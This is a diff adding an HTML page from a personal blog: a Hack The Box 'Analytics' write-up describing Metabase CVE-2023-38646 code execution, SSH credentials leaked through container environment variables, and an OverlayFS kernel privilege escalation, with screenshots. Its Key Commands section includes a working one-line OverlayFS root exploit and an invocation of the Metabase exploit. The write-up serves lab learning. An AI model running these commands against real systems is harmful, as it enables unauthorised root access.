@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Analytics | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Container Escape and Kernel Privilege Escalation</p>
+      <h1>HTB Analytics</h1>
+      <p class="headline">Metabase setup-token RCE, Docker environment credential leakage and OverlayFS escalation</p>
+      <p class="meta">Retired - Root / Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Analytics exposes Metabase on a subdomain. The installed version is vulnerable to CVE-2023-38646, where the setup token can be abused to reach code execution through the setup validation endpoint.</p>
+<h2>Initial Access</h2>
+<p>The exploit lands inside a Docker container as the Metabase user. Environment variables reveal reusable SSH credentials for the host.</p>
+<h2>Privilege Escalation</h2>
+<p>Host enumeration identifies an Ubuntu Jammy kernel affected by OverlayFS privilege escalation issues. The final payload uses user namespaces, overlay mounts and a capability-enabled Python binary to spawn a root shell.</p>
+<h2>Publishing Note</h2>
+<p>Recovered passwords are described but not repeated in full in the public Markdown source. Screenshots remain as evidence of the chain.</p>
+<h2>Key Commands</h2>
+<pre><code class="language-bash">curl http://data.analytical.htb/ | grep version</code></pre>
+<pre><code class="language-bash">python3 exploit.py -u http://data.analytical.htb/ -c &quot;id&quot;</code></pre>
+<pre><code class="language-bash">env</code></pre>
+<pre><code class="language-bash">ssh metalytics@analytical.htb</code></pre>
+<pre><code class="language-bash">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c &#39;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#39;</code></pre>
+<h2>Evidence Trail</h2>
+<p>The following screenshots preserve the original lab evidence sequence from the Obsidian notes.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507182548.png" alt="analytics evidence 01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507182748.png" alt="analytics evidence 02" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507183018.png" alt="analytics evidence 03" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507183715.png" alt="analytics evidence 04" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507183910.png" alt="analytics evidence 05" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507184107.png" alt="analytics evidence 06" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507184215.png" alt="analytics evidence 07" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507184240.png" alt="analytics evidence 08" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507184526.png" alt="analytics evidence 09" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507185208.png" alt="analytics evidence 10" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507190448.png" alt="analytics evidence 11" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/analytics/Pasted%20image%2020260507191450.png" alt="analytics evidence 12" /></figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
